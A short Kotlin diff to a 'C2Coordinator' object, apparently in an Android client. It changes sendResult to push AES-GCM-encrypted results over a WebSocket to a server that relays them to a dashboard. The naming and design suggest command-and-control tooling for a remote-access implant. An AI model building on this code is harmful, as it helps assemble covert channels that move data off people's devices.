@@ -88,8 +88,14 @@ object C2Coordinator {
         fcmToken = token
     }
 
+    /**
+     * Pushes an unsolicited result (already-serialized JSON string) to the server
+     * over the live WebSocket. The payload is AES-GCM encrypted and wrapped in a
+     * `result` WS message so the server's handleResult() decrypts + broadcasts it
+     * to the dashboard via SSE.
+     */
     fun sendResult(payload: String) {
-        ws?.send(CryptoEngine.encrypt(payload))
+        ws?.sendResult("live_push", CryptoEngine.encrypt(payload))
     }
 
     fun isConnected(): Boolean = ws?.isConnected() == true
